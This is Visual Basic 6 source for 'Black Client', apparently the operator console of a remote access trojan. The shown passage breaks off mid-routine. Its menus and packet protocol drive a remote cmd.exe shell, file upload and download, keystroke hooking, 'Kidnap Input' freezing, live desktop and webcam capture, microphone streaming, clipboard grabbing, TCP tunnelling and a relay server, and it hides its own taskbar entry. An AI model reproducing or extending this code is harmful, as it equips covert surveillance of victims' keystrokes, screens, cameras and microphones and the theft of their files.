VERSION 5.00
Begin VB.Form Client 
   Appearance      =   0  'Flat
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   ClientHeight    =   5775
   ClientLeft      =   120
   ClientTop       =   15
   ClientWidth     =   8700
   ControlBox      =   0   'False
   FillColor       =   &H00FFFFFF&
   BeginProperty Font 
      Name            =   "Arial"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   ForeColor       =   &H00FFFFFF&
   Icon            =   "Client.frx":0000
   LinkTopic       =   "Form1"
   LockControls    =   -1  'True
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5775
   ScaleWidth      =   8700
   StartUpPosition =   2  'ÆÁÄ»ÖÐÐÄ
   Begin VB.Timer CameraDelay 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   4800
      Top             =   2880
   End
   Begin VB.Timer Focuser 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   3720
      Top             =   1440
   End
   Begin VB.Timer MouseSender 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   5760
      Top             =   1440
   End
   Begin VB.Timer KeyReader 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   4800
      Top             =   1440
   End
   Begin VB.Timer BMPShow 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   5760
      Top             =   2160
   End
   Begin VB.Timer DesktopDelay 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   4800
      Top             =   2160
   End
   Begin VB.Timer CmdReader 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   4800
      Top             =   720
   End
   Begin VB.TextBox Text2 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H00FFFFFF&
      Height          =   240
      Left            =   240
      TabIndex        =   2
      Top             =   5280
      Width           =   8535
   End
   Begin VB.Timer Speed 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   3720
      Top             =   2160
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   5325
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      TabStop         =   0   'False
      Top             =   0
      Width           =   8715
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00FFFFFF&
      X1              =   0
      X2              =   8760
      Y1              =   5520
      Y2              =   5520
   End
   Begin VB.Label Label3 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   "X"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   8520
      TabIndex        =   4
      Top             =   5520
      Width           =   255
   End
   Begin VB.Label Label1 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   " >"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   0
      TabIndex        =   1
      Top             =   5280
      Width           =   255
   End
   Begin VB.Label Label2 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      Caption         =   " Black Client"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   0
      TabIndex        =   3
      Top             =   5520
      Width           =   8775
   End
   Begin VB.Menu Mfile 
      Caption         =   "&File"
      Begin VB.Menu Mconnect 
         Caption         =   "&Connect to..."
      End
      Begin VB.Menu Mdisconnect 
         Caption         =   "&Disconnect"
      End
      Begin VB.Menu sep1 
         Caption         =   "-"
      End
      Begin VB.Menu Mmidserver 
         Caption         =   "&Mid Server..."
      End
      Begin VB.Menu sep2 
         Caption         =   "-"
      End
      Begin VB.Menu Mrestartserver 
         Caption         =   "&Restart server"
      End
      Begin VB.Menu Mstopserver 
         Caption         =   "&Stop server"
      End
   End
   Begin VB.Menu Mtool 
      Caption         =   "&Tool"
      Begin VB.Menu Mexplorer 
         Caption         =   "&Explorer..."
      End
      Begin VB.Menu Mremotecmd 
         Caption         =   "&Remote CMD"
         Begin VB.Menu Mopencmd 
            Caption         =   "&Open"
         End
         Begin VB.Menu Mclosecmd 
            Caption         =   "&Close"
         End
      End
      Begin VB.Menu Mshell 
         Caption         =   "&Shell..."
      End
      Begin VB.Menu Mtunnel 
         Caption         =   "&TCP Tunnel..."
      End
      Begin VB.Menu Mhook 
         Caption         =   "&Hook Input"
         Begin VB.Menu Mhookon 
            Caption         =   "&On"
         End
         Begin VB.Menu Mhookoff 
            Caption         =   "&Off"
         End
      End
      Begin VB.Menu Mkidnap 
         Caption         =   "&Kidnap Input"
         Begin VB.Menu Mkidon 
            Caption         =   "&On"
         End
         Begin VB.Menu Mkidoff 
            Caption         =   "&Off"
         End
      End
      Begin VB.Menu Moption 
         Caption         =   "&Options..."
      End
   End
   Begin VB.Menu Mlive 
      Caption         =   "&Live"
      Begin VB.Menu Mdesktop 
         Caption         =   "&Desktop"
         Begin VB.Menu Moriginal 
            Caption         =   "&Original Size"
         End
         Begin VB.Menu Msmall 
            Caption         =   "&Small Size"
         End
         Begin VB.Menu sep3 
            Caption         =   "-"
         End
         Begin VB.Menu Mcompress 
            Caption         =   "Image &Compress"
            Begin VB.Menu Mbmp 
               Caption         =   "&BMP"
            End
            Begin VB.Menu Mgif 
               Caption         =   "&GIF"
            End
            Begin VB.Menu Mjpg 
               Caption         =   "&JPG"
            End
         End
         Begin VB.Menu Mevent 
            Caption         =   "Mouse && Keybord &Event"
            Begin VB.Menu Meventon 
               Caption         =   "&On"
            End
            Begin VB.Menu Meventoff 
               Caption         =   "&Off"
            End
         End
      End
      Begin VB.Menu Mcamera 
         Caption         =   "&Camera"
         Begin VB.Menu Mcamerashot 
            Caption         =   "&Take Camerashot"
         End
         Begin VB.Menu Mcameralive 
            Caption         =   "Camera &Live"
            Begin VB.Menu Mcameraoriginal 
               Caption         =   "&Original"
            End
            Begin VB.Menu Mcamerasmall 
               Caption         =   "&Small"
            End
         End
         Begin VB.Menu sep7 
            Caption         =   "-"
         End
         Begin VB.Menu Mmedia 
            Caption         =   "Capture &Media"
            Begin VB.Menu Mmediaclipboard 
               Caption         =   "&Clipboard"
            End
            Begin VB.Menu Mmediafile 
               Caption         =   "&File"
            End
         End
      End
      Begin VB.Menu sep5 
         Caption         =   "-"
      End
      Begin VB.Menu Mjpgquality 
         Caption         =   "JPG &Quality"
         Begin VB.Menu Mjq0 
            Caption         =   "&0%"
         End
         Begin VB.Menu Mjq10 
            Caption         =   "&10%"
         End
         Begin VB.Menu Mjq20 
            Caption         =   "&20%"
         End
         Begin VB.Menu Mjq30 
            Caption         =   "&30%"
         End
         Begin VB.Menu Mjq40 
            Caption         =   "&40%"
         End
         Begin VB.Menu Mjq50 
            Caption         =   "&50%"
         End
         Begin VB.Menu Mjq60 
            Caption         =   "&60%"
         End
         Begin VB.Menu Mjq70 
            Caption         =   "&70%"
         End
         Begin VB.Menu Mjq80 
            Caption         =   "&80%"
         End
         Begin VB.Menu Mjq90 
            Caption         =   "&90%"
         End
         Begin VB.Menu Mjq100 
            Caption         =   "&100%"
         End
      End
      Begin VB.Menu sep6 
         Caption         =   "-"
      End
      Begin VB.Menu Mvoice 
         Caption         =   "&Voice"
         Begin VB.Menu Mvoiceon 
            Caption         =   "&On"
            Begin VB.Menu Mvoicehigh 
               Caption         =   "&High Quality"
            End
            Begin VB.Menu Mvoicelow 
               Caption         =   "&Low Quality"
            End
         End
         Begin VB.Menu Mvoiceoff 
            Caption         =   "&Off"
         End
         Begin VB.Menu sep4 
            Caption         =   "-"
         End
         Begin VB.Menu Mbuffer 
            Caption         =   "&Buffer"
            Begin VB.Menu Mbuffer1 
               Caption         =   "&1 sec"
            End
            Begin VB.Menu Mbuffer2 
               Caption         =   "&2 sec"
            End
            Begin VB.Menu Mbuffer5 
               Caption         =   "&5 sec"
            End
         End
      End
   End
   Begin VB.Menu Mhelp 
      Caption         =   "&Help"
      Begin VB.Menu Mabout 
         Caption         =   "&About..."
      End
   End
End
Attribute VB_Name = "Client"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Public WithEvents TCP As CSocketPlus
Attribute TCP.VB_VarHelpID = -1
Private Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private dataBytes() As Byte
Private leftBytes() As Byte
Private dataLeft As Boolean
Private dataBytesA() As Byte
Private leftBytesA() As Byte
Private dataLeftA As Boolean
Public packageLen As Long
Private Const headLen As Long = 10 'length of the package head
Private driveList As String
Private dirPath As String
Private dirList As String
Private fileList As String
Private globalCmding As Boolean
Private globalHooking As Boolean
Public downloading As Boolean
Public uploading As Boolean
Public downloadLength As Long
Public uploadLength As Long
Public lastdownload As Long
Public lastupload As Long
Public miniDesktop As Boolean
Private desktopTransLen As Long
Public globalDesktoping As Boolean
Public desktoping As Boolean
Private firstDesktop As Boolean
Private imageType As Long
Private imageLeft As Long
Private imageTop As Long
Private imageWidth As Long
Private imageHeight As Long
Public sendEvent As Boolean
Private BMPNow() As Byte
Private tunnelMode As Boolean
Public tunnelListen As Boolean
Public tunnelConnected As Boolean
Public tunnelData As String
Private mixerList As String
Private jpgData() As Byte
Private jpgPos As Long
Private cameraTransLen As Long
Public globalCameraing As Boolean
Public cameraing As Boolean
Private cameraData() As Byte
Private cameraPos As Long
Private miniCamera As Boolean
Public cameraShot As Boolean

Public Function getTimeString() As String
    On Error Resume Next
    getTimeString = Format(Now, "yyyymmddhhnnss") & (Timer * 100) Mod 100
End Function

Private Sub CmdReader_Timer()
    On Error Resume Next
    CmdReader.Enabled = False
    If globalCmding = False Then Exit Sub
    SendData ChrB(3)
End Sub

Private Sub Focuser_Timer()
    On Error Resume Next
    If globalDesktoping = False Or sendEvent = False Then
        UnHook
        Focuser.Enabled = False
        Exit Sub
    End If
    If GetForegroundWindow() = Desktop.hwnd Then
        EnableHook
    Else
        UnHook
    End If
End Sub

Private Sub PreEnd()
    On Error Resume Next
    TCP_CloseSck 0
    TCP.CloseSck 0
    TCP.CloseSck 1
    TCP.CloseSck 2
    TCP.CloseSck 3
End Sub

Private Sub Form_Unload(Cancel As Integer)
    On Error Resume Next
    PreEnd
End Sub

Private Sub KeyReader_Timer()
    On Error Resume Next
    KeyReader.Enabled = False
    If globalHooking = False Then Exit Sub
    SendData ChrB(56)
End Sub

Private Sub Mjq0_Click()
    On Error Resume Next
    SendData ChrB(82) + ChrB(0)
End Sub

Private Sub Mjq10_Click()
    On Error Resume Next
    SendData ChrB(82) + ChrB(10)
End Sub

Private Sub Mjq100_Click()
    On Error Resume Next
    SendData ChrB(82) + ChrB(100)
End Sub

Private Sub Mjq20_Click()
    On Error Resume Next
    SendData ChrB(82) + ChrB(20)
End Sub

Private Sub Mjq30_Click()
    On Error Resume Next
    SendData ChrB(82) + ChrB(30)
End Sub

Private Sub Mjq40_Click()
    On Error Resume Next
    SendData ChrB(82) + ChrB(40)
End Sub

Private Sub Mjq50_Click()
    On Error Resume Next
    SendData ChrB(82) + ChrB(50)
End Sub

Private Sub Mjq60_Click()
    On Error Resume Next
    SendData ChrB(82) + ChrB(60)
End Sub

Private Sub Mjq70_Click()
    On Error Resume Next
    SendData ChrB(82) + ChrB(70)
End Sub

Private Sub Mjq80_Click()
    On Error Resume Next
    SendData ChrB(82) + ChrB(80)
End Sub

Private Sub Mjq90_Click()
    On Error Resume Next
    SendData ChrB(82) + ChrB(90)
End Sub

Private Sub Mmediaclipboard_Click()
    On Error Resume Next
    SendData ChrB(83) + ChrB(0)
    CameraDelay.Interval = 1000
    Options.Text3.Text = 1000
End Sub

Private Sub Mmediafile_Click()
    On Error Resume Next
    SendData ChrB(83) + ChrB(1)
    CameraDelay.Interval = 5000
    Options.Text3.Text = 5000
End Sub

Private Sub Mmidserver_Click()
    On Error Resume Next
    MidServer.Show , Client
End Sub

Private Sub MouseSender_Timer()
    On Error Resume Next
    MouseSender.Enabled = False
    If sendEvent = False Then Exit Sub
    SendData ChrB(40) + ChrB(0) + Desktop.getPos
End Sub

Private Sub Form_Load()
    On Error Resume Next
    App.TaskVisible = False
    ChDir App.Path
    'interface
    Text1.Text = ""
    Text2.Locked = True
    Mdisconnect.Enabled = False
    Mrestartserver.Enabled = False
    Mstopserver.Enabled = False
    Mtool.Enabled = False
    Mlive.Enabled = False
    'initiate
    hooked = False
    waveReady = False
    Set TCP = New CSocketPlus
    TCP.ArrayAdd 0
    TCP.ArrayAdd 1
    TCP.ArrayAdd 2
    TCP.ArrayAdd 3
End Sub

Private Function makeHead(ByRef head As String) As String
    On Error Resume Next
    Dim i As Long
    makeHead = LeftB(head, headLen)
    For i = LenB(head) + 1 To headLen
        makeHead = makeHead + ChrB(0)
    Next i
End Function

Private Sub Speed_Timer()
    On Error Resume Next
    Dim width As Long
    If downloading = True Then
        Dim currentdownload As Long
        currentdownload = Seek(1) - 1
        width = currentdownload / downloadLength * Explorer.Shape4.width
        Explorer.Shape6.width = IIf(width > Explorer.Shape4.width, Explorer.Shape4.width, width)
        Explorer.Label6.ToolTipText = CStr(CLng(currentdownload / 1024)) + "K/" + CStr(CLng(downloadLength / 1024)) + "K at " + CStr(CLng((currentdownload - lastdownload) / 1024)) + "KB/s"
        lastdownload = currentdownload
    End If
    If uploading = True Then
        Dim currentupload As Long
        currentupload = Seek(2) - 1
        width = (uploadLength - currentupload) / uploadLength * Explorer.Shape7.width
        Explorer.Shape8.width = IIf(width < 0, 0, width)
        Explorer.Label7.ToolTipText = CStr(CLng(currentupload / 1024)) + "K/" + CStr(CLng(uploadLength / 1024)) + "K at " + CStr(CLng((currentupload - lastupload) / 1024)) + "KB/s"
        lastupload = currentupload
    End If
End Sub

Private Sub TCP_Connect(ByVal Index As Variant)
    On Error Resume Next
    If Index = 0 Then
        dataLeft = False
        'interface
        Label2.Caption = " Black Client - Connected with " & TCP.RemoteHostIP(0)
    ElseIf Index = 1 Then
        tunnelConnected = True
        SendData ChrB(51)
    ElseIf Index = 2 Then
        dataLeftA = False
        TCP.SendData 2, "{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}"
        MidServer.Label2.Caption = "Disconnect"
        MidServer.Text1.Locked = True
        MidServer.Label5.Visible = True
        MidServer.Shape2.Visible = True
        MidServer.List1.Clear
        MidServer.List2.Clear
        MidServer.List3.Clear
        Mid_Listen
    End If
End Sub

Private Sub Mid_Listen()
    On Error Resume Next
    Err.Clear
    TCP.CloseSck 3
    TCP.LocalPort(3) = 24
    TCP.Listen 3
    If Err Then
    Err.Clear
    TCP.CloseSck 3
    TCP.LocalPort(3) = 40
    TCP.Listen 3
    If Err Then
    Err.Clear
    TCP.CloseSck 3
    TCP.LocalPort(3) = 60
    TCP.Listen 3
    If Err Then
    Err.Clear
    TCP.CloseSck 3
    TCP.LocalPort(3) = 9979
    TCP.Listen 3
    If Err Then
    TCP_CloseSck 2
    MessageBox MidServer.hwnd, "Failed to listen! Port in use!", "Error", vbOKOnly
    End If
    End If
    End If
    End If
End Sub

Public Sub TCP_CloseSck(ByVal Index As Variant)
    On Error Resume Next
    If Index = 0 Then
        UnHook
        WaveOutDeinit
        Close #1
        Close #2
        Close #3
        Unload Desktop
        Unload Camera
        Unload Explorer
        Unload Forward
        Unload Options
        Unload VbShell
        'resource
        tunnelData = vbNullString
        Erase leftBytes
        Erase dataBytes
        eraseDesktop
        eraseCamera
        'interface
        desktopMenuShow
        cameraMenuShow
        Mvoiceon.Enabled = True
        Mbuffer.Enabled = True
        Mhook.Enabled = True
        Text2.Locked = True
        Mconnect.Enabled = True
        Mdisconnect.Enabled = False
        Mrestartserver.Enabled = False
        Mstopserver.Enabled = False
        Mtool.Enabled = False
        Mlive.Enabled = False
        TCP.CloseSck 1
        Label2.Caption = " Black Client - Disconnected"
        TCP.CloseSck 0 'close the connect
        packageLen = 1024
        globalCmding = False
        globalHooking = False
        downloading = False
        uploading = False
        globalDesktoping = False
        globalCameraing = False
        desktoping = False
        cameraing = False
        sendEvent = False
        tunnelMode = False
        tunnelListen = False
        bufsec = 5
        Speed.Enabled = False
        BMPShow.Enabled = False
        Focuser.Enabled = False
        DesktopDelay.Enabled = False
        CameraDelay.Enabled = False
        KeyReader.Enabled = False
        MouseSender.Enabled = False
        CmdReader.Enabled = False
        DesktopDelay.Interval = 1000
        CameraDelay.Interval = 1000
    ElseIf Index = 1 Then
        SendData ChrB(60)
        TCP.CloseSck 1
        If tunnelListen = True Then TCP.Listen 1
        tunnelConnected = False
        tunnelData = vbNullString
    ElseIf Index = 2 Then
        TCP.CloseSck 3
        TCP.CloseSck 2
        Erase dataBytesA
        Erase leftBytesA
        MidServer.Label2.Caption = "Connect"
        MidServer.Text1.Locked = False
        MidServer.Label5.Visible = False
        MidServer.Shape2.Visible = False
        MidServer.List1.Clear
        MidServer.List2.Clear
        MidServer.List3.Clear
    ElseIf Index = 3 Then
        SendDataA ChrB(8)
        Mid_Listen
    End If
End Sub

Private Sub TCP_DataArrival(ByVal Index As Variant, ByVal bytesTotal As Long)
    On Error Resume Next
    Dim dataString As String
    If Index = 0 Then
        'read data
        TCP.GetData 0, dataString
        If dataLeft = True Then
            dataBytes = CStr(leftBytes) + dataString
        Else
            dataBytes = dataString
        End If
        DataCenter
    ElseIf Index = 1 Then
        'read data
        TCP.GetData 1, dataString
        If tunnelConnected = True Then
            SendData ChrB(59), dataString
        Else
            tunnelData = tunnelData + dataString
        End If
    ElseIf Index = 2 Then
        'read data
        TCP.GetData 2, dataString
        If dataLeftA = True Then
            dataBytesA = CStr(leftBytesA) + dataString
        Else
            dataBytesA = dataString
        End If
        DataCenterA
    ElseIf Index = 3 Then
        'read data
        TCP.GetData 3, dataString
        SendDataA ChrB(7), dataString
    End If
End Sub

Private Sub DataCenterA()
    On Error Resume Next
    'in case some package divided or compacted
    Dim totalLen As Long
    totalLen = UBound(dataBytesA) + 1
    If totalLen < 2 Then Exit Sub
    Dim dataLen As Long
    dataLen = CLng(dataBytesA(0)) * 256 + dataBytesA(1)
    Dim i As Long
    If totalLen < dataLen Then
        leftBytesA = dataBytesA
        dataLeftA = True
        Exit Sub
    ElseIf totalLen = dataLen Then
        dataLeftA = False
    ElseIf totalLen > dataLen Then
        dataLeftA = True
        ReDim leftBytesA(totalLen - dataLen - 1)
        CopyMemory leftBytesA(0), dataBytesA(dataLen), UBound(leftBytesA) + 1
        ReDim Preserve dataBytesA(dataLen - 1)
    End If
    'get head and data
    Dim head() As Byte
    ReDim head(headLen - 1)
    Dim hasData As Boolean
    hasData = False
    'copy head
    CopyMemory head(0), dataBytesA(2), UBound(head) + 1
    'check length
    If dataLen > headLen + 2 Then
        hasData = True
        'deal the data
        CopyMemory dataBytesA(0), dataBytesA(2 + headLen), dataLen - headLen - 2
        ReDim Preserve dataBytesA(dataLen - headLen - 3)
    End If
    Dim data() As Byte
    Dim key As Long
    key = head(0)
    'key means
    '1working id
    '2list apply
    '3list data
    '4list ack
    '5mid connect
    '6mid connected
    '7mid data
    '8mid disconnect
    
    'list data
    If key = 3 Then
        If hasData Then
            Dim listData As String
            listData = CStr(dataBytesA)
            i = InStr(listData, Chr(0))
            If i > 0 Then
                MidServer.List1.AddItem Left(listData, i - 1)
                listData = Right(listData, Len(listData) - i)
                i = InStr(listData, Chr(0))
                MidServer.List3.AddItem Right(listData, Len(listData) - i)
                If i = 0 Then i = 1
                MidServer.List2.AddItem Left(listData, i - 1)
            End If
        End If
        SendDataA ChrB(4)
    
    'mid data
    ElseIf key = 7 Then
        If hasData Then TCP.SendData 3, dataBytesA
    
    'mid disconnect
    ElseIf key = 8 Then
        Mid_Listen
    
    
    'else are bad packages
    Else
        'nothing
    End If
    'retreat
    If dataLeftA = True Then
        dataBytesA = leftBytesA
        DataCenterA
    End If
End Sub

Private Sub DataCenter()
    On Error Resume Next
    'in case some package divided or compacted
    Dim totalLen As Long
    totalLen = UBound(dataBytes) + 1
    If totalLen < 2 Then Exit Sub
    Dim dataLen As Long
    dataLen = CLng(dataBytes(0)) * 256 + dataBytes(1)
    Dim i As Long
    If totalLen < dataLen Then
        leftBytes = dataBytes
        dataLeft = True
        Exit Sub
    ElseIf totalLen = dataLen Then
        dataLeft = False
    ElseIf totalLen > dataLen Then
        dataLeft = True
        ReDim leftBytes(totalLen - dataLen - 1)
        CopyMemory leftBytes(0), dataBytes(dataLen), UBound(leftBytes) + 1
        ReDim Preserve dataBytes(dataLen - 1)
    End If
    'get head and data
    Dim head() As Byte
    ReDim head(headLen - 1)
    Dim hasData As Boolean
    hasData = False
    'copy head
    CopyMemory head(0), dataBytes(2), UBound(head) + 1
    'check length
    If dataLen > headLen + 2 Then
        hasData = True
        'deal the data
        CopyMemory dataBytes(0), dataBytes(2 + headLen), dataLen - headLen - 2
        ReDim Preserve dataBytes(dataLen - headLen - 3)
    End If
    Dim data() As Byte
    Dim key As Long
    key = head(0)
    'key means
    '1command package
    '2command reply
    '3command ack
    '4download apply
    '5download reply
    '6download data
    '7download ack
    '8download finish
    '9download cancel
    '10upload apply
    '11upload reply
    '12upload data
    '13upload ack
    '14upload finish
    '15open cmd
    '16open cmd faild
    '17close cmd
    '18disconnect
    '19end me
    '20package length
    '21desktop apply
    '22desktop reply
    '23take a camerashot
    '24download failed,deny
    '25upload failed,deny
    '26connected ack
    '27open cmd success
    '28shell command
    '29apply driverlist
    '30driverlist data
    '31drivelist ack
    '32apply dirlist
    '33dirlist data
    '34dirlist ack
    '35change driver
    '36desktop data
    '37desktop ack
    '38desktop finish
    '39desktop info
    '40mouse event
    '41imagetype
    '42bmp desktop data
    '43bmp desktop ack
    '44bmp desktop finish
    '45bmp desktop info
    '46desktop cancel
    '47tunnel make
    '48tunnel ok
    '49tunnel failed
    '50tunnel connect
    '51tunnel connected
    '52keyboard event
    '53hook enable
    '54hook disable
    '55hook data
    '56hook ack
    '57freeze
    '58unfreeze
    '59tunnel data
    '60tunnel disconnect
    '61tunnel disable
    '62mouse hook
    '63unmouse hook
    '64restart server
    '65wave start
    '66wave error
    '67wave stop
    '68wave data
    '69wave ack
    '70wave finish
    '71mixer apply
    '72mixer data
    '73mixer ack
    '74set mixer
    '75buf length
    '76camera apply
    '77camera reply
    '78camera data
    '79camera ack
    '80camera finish
    '81camera cancel
    '82jpg quality
    '83capture media
    '84camera error
    '85clipboard apply
    '86clipboard data
    
    'Debug.Print key
    'connected ack
    If key = 26 Then
        packageLen = 1024
        globalCmding = False
        globalHooking = False
        downloading = False
        uploading = False
        globalDesktoping = False
        globalCameraing = False
        desktoping = False
        cameraing = False
        sendEvent = False
        tunnelMode = False
        tunnelListen = False
        bufsec = 5
        Text1.Text = ""
        Mconnect.Enabled = False
        Mdisconnect.Enabled = True
        Mrestartserver.Enabled = True
        Mstopserver.Enabled = True
        Mtool.Enabled = True
        Mlive.Enabled = True
        
    ElseIf key = 16 Then
        Text2.Text = ""
        Text2.Locked = True
        MessageBox Client.hwnd, "Failed to open cmd.exe!", "Error", vbOKOnly
        
    ElseIf key = 27 Then
        Text1.Text = ""
        Text2.Text = ""
        Text2.Locked = False
        globalCmding = True
        CmdReader.Enabled = True
        
    ElseIf key = 2 Then
        If globalCmding = True Then
            If hasData Then
                Text1.Text = Text1.Text + CStr(dataBytes)
                If Len(Text1.Text) > 32000 Then Text1.Text = Right(Text1.Text, 16000)
                Text1.SelStart = Len(Text1.Text)
                SendData ChrB(3)
            Else
                CmdReader.Enabled = True
            End If
        End If
    
    ElseIf key = 30 Then 'drivelist data
        If head(1) = 1 Then
            driveList = ""
            Explorer.Combo1.Clear
            Explorer.List1.Clear
            Explorer.List2.Clear
            Explorer.Text1.Text = ""
            Explorer.hideDownloadButton
        End If
        If hasData Then driveList = driveList + CStr(dataBytes)
        dealDriveList
        SendData ChrB(31)
        
    ElseIf key = 33 Then
        If head(1) = 1 Then
            dirList = ""
            fileList = ""
            Explorer.List1.Clear
            Explorer.List2.Clear
            If hasData Then dirPath = CStr(dataBytes)
            Explorer.Text1.Text = dirPath
            Explorer.Text1.SelStart = Len(Explorer.Text1.Text)
            Explorer.hideDownloadButton
            Explorer.showUploadButton
        ElseIf head(1) = 2 Then
            If hasData Then dirPath = dirPath + CStr(dataBytes)
            Explorer.Text1.Text = dirPath
            Explorer.Text1.SelStart = Len(Explorer.Text1.Text)
        ElseIf head(1) = 3 Then
            If hasData Then dirList = dirList + CStr(dataBytes)
            dealDirList
        Else
            If hasData Then fileList = fileList + CStr(dataBytes)
            dealFileList
        End If
        SendData ChrB(34)
        
    ElseIf key = 24 Then
        If downloading = True Then
            Close #1
            downloading = False
            Explorer.showDownloadButton
            MessageBox Explorer.hwnd, "File not found!", "Download Failed", vbOKOnly
        End If
        
    ElseIf key = 5 Then
        If downloading = True Then
            downloadLength = 0
            For i = 1 To 4
                downloadLength = downloadLength * 256 + head(i)
            Next i
            'progress
            Explorer.showDownloadProgress
            lastdownload = Seek(1) - 1
            Speed.Enabled = True
            SendData ChrB(7)
        End If
        
    ElseIf key = 6 Then
        If downloading = True Then
            If hasData Then Put #1, , dataBytes
            'send ack
            SendData ChrB(7)
        End If
        
    ElseIf key = 8 Then
        If downloading = True Then
            Close #1
            downloading = False
            If uploading = False Then Speed.Enabled = False
            Explorer.hideDownloadProgress
            Explorer.showDownloadButton
            MessageBox Explorer.hwnd, "Download finished!", "Notify", vbOKOnly
        End If
    
    ElseIf key = 25 Then
        If uploading = True Then
            Close #2
            uploading = False
            Explorer.showUploadButton
            MessageBox Explorer.hwnd, "Write error!", "Upload Failed", vbOKOnly
        End If
    
    ElseIf key = 11 Then
        If uploading = True Then
            Dim breakPoint As Long
            breakPoint = 0
            For i = 1 To 4
                breakPoint = breakPoint * 256 + head(i)
            Next i
            Seek #2, breakPoint + 1
            uploadLength = LOF(2)
            'progress
            Explorer.showUploadProgress
            lastupload = Seek(2) - 1
            Speed.Enabled = True
            'send fake data
            SendData ChrB(12)
        End If
    
    ElseIf key = 13 Then
        If uploading = True Then
            If Seek(2) > LOF(2) Then
                'upload finish
                Close #2
                uploading = False
                SendData ChrB(14)
                If downloading = False Then Speed.Enabled = False
                Explorer.hideUploadProgress
                Explorer.showUploadButton
                MessageBox Explorer.hwnd, "Upload finished!", "Notify", vbOKOnly
            Else
                'read data from file
                ReDim data(packageLen - 1)
                Get #2, , data
                If EOF(2) Then ReDim Preserve data(packageLen - Seek(2) + LOF(2))
                'send data
                SendData ChrB(12), CStr(data)
            End If
        End If
        
    ElseIf key = 22 Then
        If globalDesktoping = True And desktoping = False Then
            desktopTransLen = 0
            desktoping = True
            Desktop.Picture1.width = (CLng(head(1)) * 256 + head(2)) * Screen.TwipsPerPixelX
            Desktop.Picture1.Height = (CLng(head(3)) * 256 + head(4)) * Screen.TwipsPerPixelY
            Desktop.Form_Resize
            If Desktop.Visible = False Then
                Desktop.Form_Show
                Focuser.Enabled = True
            End If
            firstDesktop = True
            imageType = head(5)
            'send screen ack
            If imageType = 0 Then 'bmp
                SendData ChrB(43)
            Else 'jpg/gif
                SendData ChrB(37)
            End If
        End If
    
    ElseIf key = 39 Then
        If desktoping = True And imageType <> 0 Then
            If firstDesktop = False Then drawPicture
            imageLeft = CLng(head(1)) * 256 + head(2)
            imageTop = CLng(head(3)) * 256 + head(4)
            imageWidth = CLng(head(5)) * 256 + head(6)
            imageHeight = CLng(head(7)) * 256 + head(8)
            jpgPos = 0
            firstDesktop = False
            SendData ChrB(37)
        End If
        
    ElseIf key = 36 Then
        If desktoping = True And imageType <> 0 Then
            If hasData Then
                ReDim Preserve jpgData(jpgPos + UBound(dataBytes))
                CopyMemory jpgData(jpgPos), dataBytes(0), UBound(dataBytes) + 1
                jpgPos = jpgPos + UBound(dataBytes) + 1
                desktopTransLen = desktopTransLen + UBound(dataBytes) + 1
            End If
            SendData ChrB(37)
        End If
    
    ElseIf key = 38 Then
        If desktoping = True And imageType <> 0 Then
            desktoping = False
            If firstDesktop = False Then drawPicture
            DesktopDelay.Enabled = True
            Desktop.Text1.ToolTipText = desktopTransLen \ 1024 & "K"
            Desktop.Picture2.ToolTipText = desktopTransLen \ 1024 & "K"
        End If
    
    ElseIf key = 45 Then
        If desktoping = True And imageType = 0 Then
            Dim Length As Long
            Length = 0
            For i = 1 To 4
                Length = Length * 256 + head(i)
            Next i
            ReDim Preserve BMPNow(Length)
            BMPShow.Enabled = True
            SendData ChrB(43)
        End If
        
    ElseIf key = 42 Then
        If desktoping = True And imageType = 0 Then
            If hasData Then
                Dim k As Long
                Dim m As Long
                i = 0
                For k = 1 To 4
                    i = i * 256 + head(k)
                Next k
                Dim j As Long
                j = 0
                Do While j <= UBound(dataBytes)
                    If j + 2 > UBound(dataBytes) Then
                        BMPNow(i) = dataBytes(j)
                        j = j + 1
                        i = i + 1
                        If j = UBound(dataBytes) Then
                            BMPNow(i) = dataBytes(j)
                            j = j + 1
                            i = i + 1
                        End If
                        Exit Do
                    End If
                    m = dataBytes(j)
                    If m = 0 Then
                        m = dataBytes(j + 1)
                        j = j + 2
                        For k = 1 To m
